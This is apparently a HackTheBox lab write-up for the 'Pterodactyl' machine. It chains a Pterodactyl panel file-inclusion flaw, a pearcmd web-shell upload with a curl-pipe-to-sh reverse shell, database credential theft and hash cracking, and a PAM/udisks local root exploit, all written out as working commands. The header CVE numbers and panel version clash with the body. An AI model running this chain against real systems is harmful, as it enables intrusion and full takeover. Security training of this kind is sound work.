---
title: "Pterodactyl"
date: 2026-05-17 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Pterodactyl, LFI-To-RCE, CVE-2026-6018, CVE-2026-6019]
description: Writeup for HackTheBox Pterodactyl machine
image:
  path: assets/img/pterodactyl/pterodactyl.png
  alt: HTB Pterodactyl
---

### Nmap Scan

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for 10.129.42.218
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2026-02-12 00:30:02 PKT for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOouXDOkVrDkob+tyXJOHu3twWDqor3xlKgyYmLIrPasaNjhBW/xkGT2otP1zmnkTUyGfzEWZGkZB2Jkaivmjgc=
|   256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTXNuX5oJaGQJfvbga+jM+14w5ndyb0DN0jWJHQCDd9
80/tcp open  http    syn-ack ttl 63 nginx 1.21.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/

```

Two ports are open, 22 (SSH) and 80 (Web). OpenSSH banner tells it is a recent version of Linux. Add hostname `pterodactyl.htb` to /etc/hosts

```
┌──(kali㉿kali)-[~]
└─$ echo "$ip  pterodactyl.htb" | sudo tee -a /etc/hosts
```

### WEB 

On Web (http://pterodactyl.htb), we have a game server `MonitorLand` build on [Pterodactyl](https://pterodactyl.io/)

`Pterodactyl` is a free, open-source game server management panel built with PHP, React, and Go. Designed with security in mind, Pterodactyl runs all game servers in isolated Docker containers while exposing a beautiful and intuitive UI to end users.

<img src="assets/img/pterodactyl/pterodactyl_htb.png" alt="error loading image">

There is a link at the bottom for `/changelog.txt`

```
┌──(kali㉿kali)-[~]
└─$ curl http://pterodactyl.htb/changelog.txt   

MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

`Pterodactyl v1.11.10` is installed with backend database `MariaDB 11.8.3`.  `PHP-FPM (FastCGI Process Manager)` and `PHP-PEAR` are enabled along with `/phpinfo.php` page. 

`PHP-FPM` is an alternative PHP FastCGI implementation which, instead of spawning a new PHP process for every request (like traditional CGI), maintains a pool of worker processes that are ready to handle requests immediately. In a multi-site server setup, enabling FPM per-domain means each virtual host gets its own FPM pool, providing isolation and performance tuning per site.

`PHP-PEAR (PHP Extension and Application Repository)` PHP-PEAR is a framework and distribution system for reusable PHP components — essentially PHP's older package manager. The pear command-line tool can be used to install, upgrade, and manage PHP packages. In PHP 7.3 and earlier, pecl/pear are installed by default. In PHP 7.4 and later, we need to specify them --with-pear when compiling PHP. However, pcel/pear will be installed by default in any version of Docker image, and the installation path is /usr/local/lib/php

http://pterodactyl.htb/phpinfo.php
<img src="assets/img/pterodactyl/phpinfo.png" alt="error loading image">

#### Virtual Hosts

Add virtual host `play.pterodactyl.htb` to /etc/hosts

```
┌──(kali㉿kali)-[~]
└─$ echo "$ip  play.pterodactyl.htb" | sudo tee -a /etc/hosts
```

`play.pterodactyl.htb` hosts the same site as `pterodactyl.htb`

<img src="assets/img/pterodactyl/play_pterodactyl_htb.png" alt="error loading image">

Fuzzing virtual hosts, another vhost `panel.pterodactyl.htb` is found

```
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40 --ad
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://pterodactyl.htb
[+] Method:                    GET
[+] Threads:                   40
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
panel.pterodactyl.htb Status: 200 [Size: 1897]
#www.pterodactyl.htb Status: 400 [Size: 157]
#mail.pterodactyl.htb Status: 400 [Size: 157]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
           
```
Add `panel.pterodactyl.htb` to /etc/hosts

```
┌──(kali㉿kali)-[~]
└─$ echo "$ip  panel.pterodactyl.htb" | sudo tee -a /etc/hosts
```

`panel.pterodactyl.htb` hosts the admin panel for pterodactyl

<img src="assets/img/pterodactyl/panel_pterodactyl.png" alt="error loading image">

#### CVE-2025-49132

Since `Pterodactyl v1.10.11` is installed, the panel is vulnerable to [CVE-2025-49132](https://github.com/advisories/GHSA-24wv-6c99-f843). CVE-2025-49132 is an Unauthenticated Local File Inclusion (LFI) vulnerability that can be abused to achieve Remote Code Execution. Using the /locales/locale.json with the locale and namespace query parameters, we can read php files. We can't read system files becuase the vulnerable code uses Lavarel `Translator` which only loads php files

```
use Illuminate\Translation\Translator;

class LocaleController extends Controller {
    protected Loader $loader;

    public function __construct(Translator $translator){
        $this->loader = $translator->getLoader();
    }
    ....
    ....
    ....
    $locales = explode(' ', $request->input('locale') ?? '');
    $namespaces = explode(' ', $request->input('namespace') ?? '');
    $response = [];

    foreach ($locales as $locale) {
        $response[$locale] = [];
        foreach ($namespaces as $namespace) {
            $response[$locale][$namespace] = $this->i18n(
            $this->loader->load($locale, str_replace('.', '/', $namespace))
            );
        } 
    } 
}
```
Found credentials `pterodactyl:PteraPanel` of database named `panel`

```
┌──(kali㉿kali)-[~]
└─$ curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database' | jq 
{
  "../../../pterodactyl": {
    "config/database": {
      "default": "mysql",
      "connections": {
        "mysql": {
          "driver": "mysql",
          "url": "",
          "host": "127.0.0.1",
          "port": "3306",
          "database": "panel",
          "username": "pterodactyl",
          "password": "PteraPanel",
          "unix_socket": "",
          "charset": "utf8mb4",
          "collation": "utf8mb4_unicode_ci",
          "prefix": "",
          "prefix_indexes": "1",
          "strict": "",
          "timezone": "+00{{00}}",
          "sslmode": "prefer",
          "options": {
            "1014": "1"
          }
        }
      },
      "migrations": "migrations",
      "redis": {
        "client": "predis",
        "options": {
          "cluster": "redis",
          "prefix": "pterodactyl_database_"
        },
        "default": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "0",
          "context": []
        },
        "sessions": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "1",
          "context": []
        }
      }
    }
  }
}
```

The credentails `pterodactyl:PteraPanel` are database credentials and are not valid for `panel.pterodactyl.htb`. I found Laravel `APP_KEY` in `config/app.php`

```
┌──(kali㉿kali)-[~]
└─$ curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app' | jq     
{
  "../../../pterodactyl": {
    "config/app": {
      "version": "1.11.10",
      "name": "Pterodactyl",
      "env": "production",
      "debug": "",
      "url": "http://panel.pterodactyl.htb",
      "timezone": "UTC",
      "locale": "en",
      "fallback_locale": "en",
      "key": "base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=",
      "cipher": "AES-256-CBC",
      "exceptions": {
        "report_all": ""
      }
    }
  }
  ....
  ....
  ....
}
```

I test for Laravel Cookie Deserialization RCE ([learn here](https://blog.gitguardian.com/exploiting-public-app_key-leaks/)), but the cookie content itself is hashed. Using tool [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)

```
┌──(kali㉿kali)-[~]
└─$ python3 laravel_crypto_killer.py decrypt -v eyJpdiI6Im1ZeExWeDRZNGFRZWZoOEdzbFBDN1E9PSIsInZhbHVlIjoiQUlNZTRodkRwcWxMc2VCRGV3ckFMd3hSQTRIZHJINS8vWWJuZktyVFFrb2ZkMG1jcTFybG0xQzluZTlwS1JLcHZvQklVYy82N212V1VSdFlQT0xMZ0xiSG5TbFJBUlAzTVJRd0lCc3dxeHVob3VXUVpHS25mREQ4T2tRbDNUemsiLCJtYWMiOiJmN2E5MTU2OGYyZThmMTIwNGViY2Y4NjhjMzZmODcxNWU3YjkzZDQzYWQwOGFkOTQwNjgzYzdjNDE2OTNmMzZjIiwidGFnIjoiIn0= -k base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
[+] Unciphered value identified!
[*] Unciphered value
55586b985f4aa6e8f7ca512b70fd4c3c639e297c|ailcOFxOIJ7tC7CdMDRCi2QyS8lU5A2mSsiX8wqg
[*] Base64 encoded unciphered version
b'NTU1ODZiOTg1ZjRhYTZlOGY3Y2E1MTJiNzBmZDRjM2M2MzllMjk3Y3xhaWxjT0Z4T0lKN3RDN0NkTURSQ2kyUXlTOGxVNUEybVNzaVg4d3FnDw8PDw8PDw8PDw8PDw8P'
```

#### Remote Code Execution

Since `PHP-PEAR` is installed, we can utilize `pearcmd` to upload php files on server and have Remote Code Exection. If `register_argc_argv` feature is enabled in php configuration, then query parameters that are passed as CLI arguements to `pearcmd`. RFC 3875 specifies that if the query string does not contain any unencoded characters =, the request is GET or HEAD, then the query-string needs to be passed as a command-line argument. PHP still doesn't strictly adhere to the RFC; even if the query string contains an equals sign, it will still be assigned to the specified value $_SERVER['argv']. For more detail rea this (post)[https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp]

Create a file `/tmp/shell.php` on `pterodactyl.htb` with content `<?=system('curl${IFS}10.10.15.113/rev.sh|sh')?>`

```
┌──(kali㉿kali)-[~]
└─$ curl -g $'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system(\'curl${IFS}10.10.15.113/rev.sh|sh\')?>+/tmp/shell.php'
```

Host `rev.sh` on webserver, and setup a listener

```
┌──(kali㉿kali)-[~]
└─$ cat rev.sh           
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.113 4444 >/tmp/f

┌──(kali㉿kali)-[~]
└─$ php -S 0.0.0.0:80

┌──(kali㉿kali)-[~]
└─$ ncat -lvnp 4444
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

Execute `/tmp/shell.php`, through LFI

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=john'

┌──(kali㉿kali)-[~]
└─$ php -S 0.0.0.0:80
[Wed May 20 17:35:58 2026] PHP 8.4.20 Development Server (http://0.0.0.0:80) started
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Accepted
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 [200]: GET /rev.sh
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Closing
[Wed May 20 18:39:07 2026] 10.129.43.57:56260 Accepted
[Wed May 20 18:39:07 2026] 10.129.43.57:56260 [200]: GET /rev.sh
[Wed May 20 18:39:07 2026] 10.129.43.57:56260 Closing

┌──(kali㉿kali)-[~]
└─$ ncat -lvnp 4444
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.43.57:60896.
sh: cannot set terminal process group (1214): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
id
uid=474(wwwrun) gid=477(www) groups=477(www)
```

#### User Flag 

Upgrade the shell

```
sh-4.4$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.

# ctrl + z
wwwrun@pterodactyl:/var/www/pterodactyl/public> ^Z
zsh: suspended  ncat -lvnp 4445

┌──(kali㉿kali)-[~]
└─$ stty -echo raw; fg
[1]  + continued  ncat -lvnp 4445
                                 reset
reset: unknown terminal type unknown
Terminal type? screen

wwwrun@pterodactyl:/var/www/pterodactyl/public> export TERM=xterm

┌──(kali㉿kali)-[~]
└─$ stty -a
speed 38400 baud; rows 18; columns 145; line = 0;

wwwrun@pterodactyl:/var/www/pterodactyl/public> stty rows 37 cols 145
```

Read the user flag `/home/phileasfogg3/user.txt `

```
wwwrun@pterodactyl:/var/www/pterodactyl/public> cd /home/phileasfogg3/
wwwrun@pterodactyl:/home/phileasfogg3> ls
bin  user.txt
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt 
**************cc2104220c779905
```

### Privilege Escalation

#### phileasfogg3 Credentials

Mysql is running on localhost

```
wwwrun@pterodactyl:/home/phileasfogg3> ss -tulnp            
Netid         State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port         Process         
udp           UNCONN         0              0                       0.0.0.0%eth0:68                         0.0.0.0:*                            
udp           UNCONN         0              0                          127.0.0.1:323                        0.0.0.0:*                            
udp           UNCONN         0              0                              [::1]:323                           [::]:*                            
tcp           LISTEN         0              512                          0.0.0.0:80                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:22                         0.0.0.0:*                            
tcp           LISTEN         0              100                        127.0.0.1:25                         0.0.0.0:*                            
tcp           LISTEN         0              80                         127.0.0.1:3306                       0.0.0.0:*                            
tcp           LISTEN         0              511                        127.0.0.1:6379                       0.0.0.0:*                            
tcp           LISTEN         0              512                        127.0.0.1:9000                       0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:22                            [::]:*                            
```

Users with shell access 

```
wwwrun@pterodactyl:/home/phileasfogg3> cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
headmonitor:x:1001:100::/home/headmonitor:/bin/bash
phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
```

Found password hashes of `headmonitor` and `phileasfoog3`

```
wwwrun@pterodactyl:/home/phileasfogg3> mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "show tables;"
+-----------------------+
| Tables_in_panel       |
+-----------------------+
| activity_log_subjects |
| activity_logs         |
| allocations           |
| api_keys              |
| api_logs              |
| audit_logs            |
| backups               |
| database_hosts        |
| databases             |
| egg_mount             |
| egg_variables         |
| eggs                  |
| failed_jobs           |
| jobs                  |
| locations             |
| migrations            |
| mount_node            |
| mount_server          |
| mounts                |
| nests                 |
| nodes                 |
| notifications         |
| password_resets       |
| recovery_tokens       |
| schedules             |
| server_transfers      |
| server_variables      |
| servers               |
| sessions              |
| settings              |
| subusers              |
| tasks                 |
| tasks_log             |
| user_ssh_keys         |
| users                 |
+-----------------------+
wwwrun@pterodactyl:/home/phileasfogg3> mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "select username, password from users;"
+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+--------------+--------------------------------------------------------------+
```

`phileasfogg3` hash is cracked through `rockyou.txt`

```
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (phileasfogg3)
```

SSH to `pterodactyl.htb` as `phileasfogg3`

```
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ sshpass -p '!QAZ2wsx' ssh -o StrictHostKeyChecking=no phileasfogg3@pterodactyl.htb
Warning: Permanently added 'pterodactyl.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Have a lot of fun...
Last login: Wed May 20 18:05:24 2026 from 10.10.15.113
phileasfogg3@pterodactyl:~> id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)
```

`phileasfogg3` can run ALL commands, but `targetpw` flag is enabled in sudoers file. `targetpw` flag changes sudo's behavior. Instead of asking for current user password, it requires the password of the user you are trying to become. This is not the default behavior on Debian/Ubuntu-based systems, but it is the default behavior on openSUSE and SUSE Linux Enterprise (SLES).

```
phileasfogg3@pterodactyl:~> sudo -l
[sudo] password for phileasfogg3: 
Matching Defaults entries for phileasfogg3 on pterodactyl:
    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS XDG_SESSION_COOKIE", !insults,
    secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw

User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL

phileasfogg3@pterodactyl:~> sudo su 
[sudo] password for root: 
Sorry, try again.
```

The target box is running operating system `openSUSE Leap 15.6`

```
phileasfogg3@pterodactyl:~> cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.6"
ID="opensuse-leap"
ID_LIKE="suse opensuse"
VERSION_ID="15.6"
PRETTY_NAME="openSUSE Leap 15.6"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:opensuse:leap:15.6"
BUG_REPORT_URL="https://bugs.opensuse.org"
HOME_URL="https://www.opensuse.org/"
DOCUMENTATION_URL="https://en.opensuse.org/Portal:Leap"
LOGO="distributor-logo-Leap"

phileasfogg3@pterodactyl:~> uname -a
Linux pterodactyl 6.4.0-150600.23.65-default #1 SMP PREEMPT_DYNAMIC Tue Aug 12 00:37:41 UTC 2025 (aedcb04) x86_64 x86_64 x86_64 GNU/Linux

phileasfogg3@pterodactyl:~> hostnamectl
 Static hostname: pterodactyl
       Icon name: computer-vm
         Chassis: vm
      Machine ID: 45be883d0dad41e8aedf6a01190c4ad2
         Boot ID: 9b4fecbfac824d9f9b7b07f9621f259d
  Virtualization: vmware
Operating System: openSUSE Leap 15.6              
     CPE OS Name: cpe:/o:opensuse:leap:15.6
          Kernel: Linux 6.4.0-150600.23.65-default
    Architecture: x86-64
 Hardware Vendor: VMware, Inc.
  Hardware Model: VMware Virtual Platform
Firmware Version: 6.00
   Firmware Date: Thu 2020-11-12
    Firmware Age: 5y 6month 6d 
```

`openSUSE Leap 15` is vulnerable to [CVE-2025-6018](https://www.suse.com/security/cve/CVE-2025-6018.html) and [CVE-2025-6019](https://www.suse.com/security/cve/CVE-2025-6019.html). 

The first (CVE-2025-6018) resides in the PAM configuration of openSUSE Leap 15 and SUSE Linux Enterprise 15. Using this vulnerability, an unprivileged local attacker—for example, via SSH—can elevate to the “allow_active” user and invoke polkit actions normally reserved for a physically present user.

The second (CVE-2025-6019) affects libblockdev, is exploitable via the udisks daemon included by default on most Linux distributions, and allows an “allow_active” user to gain full root privileges. Although CVE-2025-6019 on its own requires existing allow_active context, chaining it with CVE-2025-6018 enables a purely unprivileged attacker to achieve full root access.

#### CVE-2025-6018 & CVE-2025-6019 Exploit

In a nutshell, by setting `XDG_SEAT=seat0` and `XDG_VTNR=1` in `~/.pam_environment`, an unprivileged attacker who logs in via sshd on openSUSE Leap 15 or SUSE Linux Enterprise 15 can pretend that they are, in fact, a physical user who is sitting in front of the computer; i.e., an "allow_active" user, in polkit parlance.

As proof of concept, the attacker calls systemd-logind's CanReboot() method to determine whether they are authenticated as an unprivileged "allow_any" user (CanReboot() returns "challenge") or as a physical "allow_active" user (CanReboot() returns "yes").

```
phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('challenge',)
```

Set `XDG_SEAT` and `XDG_VTNR` environment variable in `~/.pam_environment`

```
phileasfogg3@pterodactyl:~> { echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment
phileasfogg3@pterodactyl:~> cat ~/.pam_environment 
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
```
Exit the current SSH session and reconnect

```
phileasfogg3@pterodactyl:~> exit

┌──(kali㉿kali)-[~]
└─$ sshpass -p '!QAZ2wsx' ssh -o StrictHostKeyChecking=no phileasfogg3@pterodactyl.htb

phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
```

Since 2017, the udisks daemon allows an "allow_active" user to resize their filesystems; and to resize an XFS filesystem (via the xfs_growfs program, which is installed by default on most Linux distributions) the udisks daemon calls the libblockdev, which temporarily mounts this XFS filesystem in /tmp (if it is not mounted elsewhere already) but *without* the nosuid and nodev flags.

Consequently, an "allow_active" attacker can simply set up a loop device that is backed by an arbitrary XFS image (which contains a SUID-root shell), then request the udisks daemon to resize this XFS filesystem (which mounts it in /tmp *without* the nosuid and nodev flags), and finally execute their SUID-root shell (from their XFS filesystem in /tmp) and therefore obtain full root privileges.

On our own attacker machine, as root, we create an XFS image that contains a SUID-root shell, and copy it to the victim machine

First copy `bash` binary from target machine

```
┌──(kali㉿kali)-[~]
└─$ sshpass -p '!QAZ2wsx' scp -o StrictHostKeyChecking=no phileasfogg3@pterodactyl.htb:/bin/bash target_bash
```

Create XFS image, mount it, set suid on bash. Then, copy XFS image back to target machine

```
┌──(kali㉿kali)-[~]
└─$ dd if=/dev/zero of=./xfs.image bs=1M count=300
300+0 records in
300+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 0.667739 s, 471 MB/s

┌──(kali㉿kali)-[~]
└─$ mkfs.xfs ./xfs.image
meta-data=./xfs.image            isize=512    agcount=4, agsize=19200 blks
         =                       sectsz=512   attr=2, projid32bit=1
         =                       crc=1        finobt=1, sparse=1, rmapbt=1
         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1
         =                       exchange=1   metadir=0
data     =                       bsize=4096   blocks=76800, imaxpct=25
         =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1, parent=1
log      =internal log           bsize=4096   blocks=16384, version=2
         =                       sectsz=512   sunit=0 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
         =                       rgcount=0    rgsize=0 extents
         =                       zoned=0      start=0 reserved=0

┌──(kali㉿kali)-[~]
└─$ sudo mount -t xfs ./xfs.image ./xfs.mount

┌──(kali㉿kali)-[~]
└─$ sudo cp ./bash ./xfs.mount

┌──(kali㉿kali)-[~]
└─$ sudo chmod 04555 ./xfs.mount/bash

┌──(kali㉿kali)-[~]
└─$ sudo umount ./xfs.mount

┌──(kali㉿kali)-[~]
└─$ sshpass -p '!QAZ2wsx' scp -o StrictHostKeyChecking=no xfs.image phileasfogg3@pterodactyl.htb:/home/phileasfogg3/xfs.image
```

Set up a loop device that is backed by our XFS image, but we first make sure that "gvfs-udisks2-volume-monitor" is not running as our user (otherwise it would automatically mount our XFS filesystem and prevent the libblockdev from mounting it itself later).

```
phileasfogg3@pterodactyl:~> pkill -KILL gvfs-udisks2-volume-monitor
gvfs-udisks2-volume-monitor: no process found

phileasfogg3@pterodactyl:~> LOOP_DEV=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction 2>&1 | grep -oP "/dev/loop\\d+")
phileasfogg3@pterodactyl:~> echo "$LOOP_DEV"
/dev/loop0
```

Request the udisks daemon to resize our XFS filesystem, which forces the libblockdev to mount it in /tmp without the nosuid and nodev flags, but we first run a tight loop that will keep our XFS filesystem busy and prevent it from being unmounted later by the libblockdev

```
phileasfogg3@pterodactyl:~> ( while true; do for dev in /tmp/blockdev*; do if [ -d "$dev" ] && [ -x "$dev/bash" ]; then echo "Caught SUID bash at $dev/bash"; "$dev/bash" -p -c "id; cat /root/root.txt" > /tmp/root_out.txt 2>&1; break 2; fi; done; sleep 0.001; done ) &
[1] 12280
```

Finally, we execute our SUID-root shell (from our XFS filesystem in /tmp) and therefore obtain full root privileges.

```
phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/$(basename "$LOOP_DEV") --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" 2>/dev/null

phileasfogg3@pterodactyl:~> sleep 30
```

#### Root Flag

The root flag will be saved to `/tmp/root_out.txt

```
phileasfogg3@pterodactyl:~> cat /tmp/root_out.txt
************244bgew4435er0er35
```
